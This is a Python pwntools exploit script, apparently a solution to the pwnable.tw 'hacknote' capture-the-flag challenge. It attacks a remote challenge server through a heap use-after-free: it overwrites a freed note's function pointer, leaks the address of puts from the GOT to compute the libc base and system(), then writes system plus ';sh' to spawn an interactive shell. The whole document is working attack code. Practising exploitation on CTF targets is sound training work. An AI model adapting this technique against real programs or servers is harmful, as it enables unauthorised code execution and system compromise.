#!/usr/bin/env python3

import pwn

io = pwn.remote('chall.pwnable.tw', 10102)
elf = pwn.ELF('./hacknote')
libc = pwn.ELF('./libc_32.so.6')

def add_note(size, data):
    io.recvuntil(':')
    io.sendline('1')
    io.recvuntil(':')
    io.sendline(str(size))
    io.recvuntil(':')
    io.sendline(data)

def delete_note(index):
    io.recvuntil(':')
    io.sendline('2')
    io.recvuntil(':')
    io.sendline(str(index))

def print_note(index):
    io.recvuntil(':')
    io.sendline('3')
    io.recvuntil(':')
    io.sendline(str(index))
    io.recvuntil(':')
    return io.recv(4)

add_note(24, 'AAAAAAA')
add_note(24, 'BBBBBBB')

delete_note(1)
delete_note(0)

# write data to ptr[1]
puts_func = 0x804862b
puts_got = elf.got[b'puts']
data = pwn.p32(puts_func) + pwn.p32(puts_got)
add_note(8, data)

# leak system address
leak = print_note(1)
puts_libc = pwn.u32(leak)
libc_base = puts_libc - libc.sym[b'puts']
system_libc = libc_base + libc.sym[b'system']

# write data to ptr[1] again
delete_note(2)
data = pwn.p32(system_libc) + b';sh' # get rid of junk value
add_note(8, data)

# print_note(1) without `io.recvuntil(':')' and `return io.recvline()'
io.recvuntil(':')
io.sendline('3')
io.recvuntil(':')
io.sendline('1')

io.interactive()
